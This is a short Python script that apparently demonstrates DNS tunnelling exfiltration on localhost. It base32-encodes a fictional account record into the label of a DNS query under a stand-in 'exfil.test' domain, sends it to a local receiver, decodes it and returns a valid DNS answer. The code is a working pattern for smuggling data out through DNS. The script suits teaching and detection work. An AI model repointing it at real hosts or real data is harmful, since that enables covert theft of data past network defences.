import base64
import socket
import struct

SERVER = ("127.0.0.1", 53)
RECORD = "ACCT:DEMO001|BAL:95000"  # Fictional demonstration data
SUFFIX = "exfil.test"


def encode_name(name):
    parts = name.split(".")
    if any(not 1 <= len(part) <= 63 for part in parts):
        raise ValueError("Invalid DNS label length")
    return b"".join(
        bytes([len(part)]) + part.encode("ascii") for part in parts
    ) + b"\x00"


def read_name(packet, offset=12):
    labels = []
    while True:
        if offset >= len(packet):
            raise ValueError("Truncated DNS name")
        length = packet[offset]
        offset += 1
        if length == 0:
            return ".".join(labels), offset
        if length > 63 or offset + length > len(packet):
            raise ValueError("Unsupported or malformed DNS label")
        labels.append(packet[offset:offset + length].decode("ascii"))
        offset += length


def main():
    label = base64.b32encode(RECORD.encode()).decode().rstrip("=")
    query_name = f"{label}.{SUFFIX}"

    # Standard DNS query: one A question, class IN.
    transaction_id = 0x1234
    query = (
        struct.pack("!6H", transaction_id, 0x0100, 1, 0, 0, 0)
        + encode_name(query_name)
        + struct.pack("!HH", 1, 1)
    )

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as receiver, \
         socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sender:

        receiver.settimeout(5)
        sender.settimeout(5)
        receiver.bind(SERVER)

        print("Local DNS receiver listening on 127.0.0.1:53")
        print("Original fictional record:", RECORD)
        print("Sending DNS query:", query_name)
        sender.sendto(query, SERVER)

        # Decode the name from the packet actually received.
        packet, client = receiver.recvfrom(4096)
        received_name, question_end = read_name(packet)
        parts = received_name.split(".")

        if len(parts) != 3 or ".".join(parts[1:]).lower() != SUFFIX:
            raise ValueError("Received an unexpected query")

        received_label = parts[0]
        padded = received_label + "=" * ((-len(received_label)) % 8)
        recovered = base64.b32decode(
            padded, casefold=True
        ).decode("utf-8")

        print("Received query:", received_name)
        print("Recovered record:", recovered)
        print("Exact record match:", recovered == RECORD)

        # Return a valid DNS answer: exfil.test lab name -> 127.0.0.1.
        question = packet[12:question_end + 4]
        response = (
            packet[:2]
            + struct.pack("!5H", 0x8180, 1, 1, 0, 0)
            + question
            + b"\xc0\x0c"
            + struct.pack("!HHIH", 1, 1, 60, 4)
            + socket.inet_aton("127.0.0.1")
        )
        receiver.sendto(response, client)

        reply, _ = sender.recvfrom(4096)
        print("DNS reply received:", len(reply), "bytes")
        print("Demo finished; both sockets are now closing.")


if __name__ == "__main__":
    try:
        main()
    except (OSError, ValueError) as error:
        print("Demo failed:", error)